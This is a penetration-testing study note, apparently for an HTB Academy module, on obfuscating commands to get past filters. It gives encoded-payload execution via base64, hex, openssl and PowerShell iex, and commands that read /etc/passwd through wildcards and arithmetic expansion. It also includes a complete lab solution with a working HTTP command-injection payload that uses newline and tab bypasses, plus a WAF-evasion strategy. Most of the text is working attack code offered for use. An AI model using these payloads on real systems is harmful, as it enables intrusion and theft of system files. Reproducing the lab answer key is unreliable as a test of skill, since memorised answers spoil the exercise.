# 🛰️ Introduction

[!ABSTRACT] This document provides advanced command obfuscation techniques for bypassing filters in penetration testing and security assessments. It covers methods such as base64 encoding, hex encoding, case manipulation, wildcard obfuscation, integer expansion, output redirection, and environment variable exploitation.

---

## Basic Command Obfuscation Techniques

### Encoding Methods

#### Base64 Encoding (Linux to Windows)

[!INFO] Convert UTF-8 text to UTF-16 before base64 encoding for cross-platform compatibility:

```bash
# Convert utf-8 to utf-16 before base64 encoding
kabaneridev@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
dwBoAG8AYQBtAGkA
```

**Step 2: Decode and Execute**

```powershell
# Decode and execute with Invoke-Expression
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

**Testing:**
```powershell
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA'))))"
21y4d
```

### Alternative Encoding Methods

#### Hex Encoding (xxd)

[!INFO] Encode to hex:

```bash
# Encode to hex
echo -n 'whoami' | xxd -p
77686f616d69

# Decode and execute
bash<<<$(xxd -r -p<<<77686f616d69)
```

#### OpenSSL Base64 (Alternative)

[!INFO] If base64 command is filtered, use openssl:

```bash
# If base64 command is filtered, use openssl
bash<<<$(openssl base64 -d <<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

---

## HTB Academy Lab Solution

### Challenge: Advanced Obfuscation

**Question:** Find the output of the following command using one of the techniques you learned in this section:
```bash
find /usr/share/ | grep root | grep mysql | tail -n 1
```

[!INFO] After spawning the target machine and visiting its website's root webpage, students need to use **Burp Suite** or **ZAP** to intercept the request made after clicking the Check button. Since the **pipe operator** (`|`) is in the command, students need to use the **third method** which encodes all characters to avoid filter detection.

### Step-by-Step Solution

**Step 1: Base64 Encode the Command**
```bash
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
```

**Command Output:**
```bash
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=
```

**Step 2: Create Decoding Command**
```bash
# Command that will decode the encoded base64 string in a sub-shell 
# and then pass it to bash to be executed
bash<<<$(base64 -d <<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

**Step 3: Bypass Filters and Execute**

Students need to:
- **Bypass space character filter** by using either `%09` (tab) or `$IFS`
- **Use newline operator** `%0a` to separate the payload from the IP address
- **Forward the modified intercepted request**

**Final Payload:**
```http
ip=127.0.0.1%0abash<<<$(base64%09-d <<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

### Lab Result

**Expected Output:**
```
/usr/share/mysql/debian_create_root_user.sql
```

Students will attain this output after successfully executing the base64-encoded command through the command injection vulnerability.

### Alternative Methods (For Reference)

**Method 2: Reversed Command**
```bash
# Step 1: Reverse the command
echo 'find /usr/share/ | grep root | grep mysql | tail -n 1' | rev
# Output: 1 n- liat | lqsym perg | toor perg | /erahs/rsu/ dnif

# Step 2: Execute reversed
ip=127.0.0.1%0a$(rev <<< '1 n- liat | lqsym perg | toor perg | /erahs/rsu/ dnif')
```

**Method 3: Case Manipulation + Encoding**
```bash
# Mixed case + base64 encoding (more complex but also viable)
echo -n 'FiNd /UsR/sHaRe/ | GrEp RoOt | GrEp MySqL | TaIl -N 1' | tr "[A-Z]" "[a-z]" | base64
```

### Key Learning Points

- **Base64 encoding** is essential when dealing with filtered pipe operators (`|`).
- **Space filter bypass** is still required even with encoding (`%09` or `$IFS`).
- **Newline injection** (`%0a`) remains the primary injection operator.
- **Burp Suite interception** is necessary to modify requests client-side validation.
- **Multiple techniques** can be combined for complex filtering scenarios.

---

## Additional Advanced Techniques

### Wildcard Obfuscation

[!INFO] Using Asterisk Wildcards:

```bash
# Original: cat
# Obfuscated: c?t or c*t
/bin/c?t /etc/passwd
```

### Integer Expansion

[!INFO] Using Bash Arithmetic:

```bash
# Using arithmetic expansion
echo $((1+1))  # outputs 2
/bin/ca$((16#74)) /etc/passwd  # 't' in hex is 74
```

### Output Redirection

[!INFO] Avoiding Pipes with Redirection:

```bash
# Instead of: cat file | grep pattern
# Use: grep pattern < file
grep root < /etc/passwd
```

### Environment Variable Exploitation

[!INFO] Advanced PATH Manipulation:

```bash
# Extract characters from multiple variables
${HOME:0:1}${PATH:5:1}${USER:2:1}  # Construct characters
```

---

## Automated Obfuscation Tools

### Recommended Tools

- [[Invoke-Obfuscation]] (PowerShell)
- [[Bashfuscator]] (Bash)
- [[DOSfuscation]] (CMD)
- Custom Python Scripts

### Tool Integration

These tools can automatically generate obfuscated payloads using the techniques covered in this section, making it easier to bypass sophisticated filters during penetration testing.

---

## Detection Evasion Strategy

### Layered Approach

1. **Start Simple** - Basic quote obfuscation
2. **Add Complexity** - Case manipulation
3. **Use Encoding** - Base64/hex when needed
4. **Combine Methods** - Multiple techniques together
5. **Custom Creation** - Unique payloads for specific filters

### Best Practices

- ✅ **Test incrementally** - Add one technique at a time.
- ✅ **Avoid common patterns** - Create unique obfuscations.
- ✅ **Consider platform** - Use appropriate methods for OS.
- ✅ **Monitor responses** - Adjust based on filter behavior.
- ✅ **Document successful methods** - For future assessments.

This comprehensive approach to advanced command obfuscation provides penetration testers with sophisticated techniques to bypass even the most advanced filtering mechanisms and WAF solutions.